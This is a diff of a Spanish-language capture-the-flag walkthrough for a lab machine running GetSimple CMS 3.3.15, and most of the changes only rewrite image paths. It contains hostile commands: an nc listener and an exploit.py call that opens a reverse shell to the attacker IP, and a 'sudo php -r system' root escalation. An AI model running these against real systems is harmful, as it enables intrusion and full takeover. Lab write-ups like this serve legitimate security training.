@@ -16,44 +16,43 @@ Empezamos con un escaneo de puertos y servicios con nmap.
 nmap -sCV -p22,80 10.129.211.160
 ```
 
-![Pasted image 20250820162115](images/Pasted image 20250820162115.png)
+![image-center](/assets/images/Pasted image 20250820162115.png)
 
 Nos dirigimos a la pagina web que corre por el peurto `80`.
 
-![Pasted image 20250820162304](images/Pasted image 20250820162304.png)
+![image-center](/assets/images/Pasted image 20250820162304.png)
 
 Si nos vamos al `robots.txt` que nos indicaba el `nmap` que habia. el cual nos indica de un directorio `/admin/` el cual nos indica `gobuster` a continuación (el cual ya previamente puse a correr en busca de subdirectorios)
 
-![Pasted image 20250820162400](images/Pasted image 20250820162400.png)
+![image-center](/assets/images/Pasted image 20250820162400.png)
 
 
 El directorio `admin` es un panel de login para la aplicacion web, el cual si probamos por credenciales default como `admin:admin` o `admin:password` vemos que las credenciales `admin:admin` funcionan y nos permiten loguear, pero y si no sabiamos eso? Bueno hay una via alternativa la cual es la que yo use para encontrar la contraseña.
 
 Como anterior mente la herramienta `gobuster` encontro posibles rutas, voy a checkear si tengo posibilidad de `directory listing`en cada una de estas, empezemos con `data` y asi con las siguientes.
 
-![Pasted image 20250820161849](images/Pasted image 20250820161849.png)
+![image-center](/assets/images/Pasted image 20250820161849.png)
 
 Al parecer si tenemos dicha capacidad.
 
-![Pasted image 20250820162942](images/Pasted image 20250820162942.png)
+![image-center](/assets/images/Pasted image 20250820162942.png)
 
 Como los que parecen poder tener informacion son `users/` y `other/` vamos a enumerarlos.
 
-![Pasted image 20250820163054](images/Pasted image 20250820163054.png)
+![image-center](/assets/images/Pasted image 20250820163054.png)
 
 Vemos que dentro de `/users` hay un `admin.xml` y si vemos su contenido, vemos unas etiquetas `pwd` que podemos intuir que es la abreviación de password, con un `hash` en `sha1`pareciera ser.
 
-![Pasted image 20250820163200](images/Pasted image 20250820163200.png)
+![image-center](/assets/images/Pasted image 20250820163200.png)
 
 Si usamos paginas como `crackstation` podemos crackearlo facilmente. y asi encontrar el password del usuario `admin`.
 
-![Pasted image 20250820163224](images/Pasted image 20250820163224.png)
+![image-center](/assets/images/Pasted image 20250820163224.png)
 
 Una vez logueados en la pagina.
 
-![Pasted image 20250820163408](images/Pasted image 20250820163408.png)
-
-![Pasted image 20250820163635](images/Pasted image 20250820163635.png)
+![image-center](/assets/images/Pasted image 20250820163408.png)
+![image-center](/assets/images/Pasted image 20250820163635.png)
 
 Vemos que corre la version `3.3.15` de `GetSimple CMS` la cual es vulenrable a RCE.
 
@@ -61,9 +60,9 @@ Vemos que corre la version `3.3.15` de `GetSimple CMS` la cual es vulenrable a R
 searchsploit getsimple CMS
 ```
 
-![Pasted image 20250820165143](images/Pasted image 20250820165143.png)
+![image-center](/assets/images/Pasted image 20250820165143.png)
 
-![Pasted image 20250820165201](images/Pasted image 20250820165201.png)
+![image-center](/assets/images/Pasted image 20250820165201.png)
 
 Nos descargamos el exploit
 
@@ -231,7 +230,7 @@ nc -nlvp 4444
 python3 exploit.py 10.129.211.160 / 10.10.16.230:4444 admin
 ```
 
-![Pasted image 20250820165554](images/Pasted image 20250820165554.png)
+![image-center](/assets/images/Pasted image 20250820165554.png)
 
 Realizamos un tratamiento de la `tty` para que no muera.
 
@@ -239,7 +238,7 @@ Viendo por permisos a nivel de `SUDOERS`
 
 ![Untitled 49 1](images/Untitled 49 1.jpg)
 
-Vemos que tenemos privilegios al usar `php`, esto es malo ya que si nos vamos a la pagina GTFObins vemos como podemos abusar de este.
+Vemos que tenemos privilegios al usar `php`, esto es malo ya que si nos vamos a la pagina `GTFObins` vemos como podemos abusar de este.
 
 ![Untitled 50 1](images/Untitled 50 1.jpg)
 
@@ -251,11 +250,11 @@ CMD="/bin/bash"
 sudo php -r "system('$CMD');"
 ```
 
-![Pasted image 20250820170002](images/Pasted image 20250820170002.png)
+![image-center](/assets/images/Pasted image 20250820170002.png)
 
-Y asi ganamos acceso como el usuario `root`y ya podemos visualizar la flag.
+Y así ganamos acceso como el usuario `root`y ya podemos visualizar la flag.
 
-![Pasted image 20250820170054](images/Pasted image 20250820170054.png)
+![image-center](/assets/images/Pasted image 20250820170054.png)
 
 ```bash 
 cat /root/root.txt
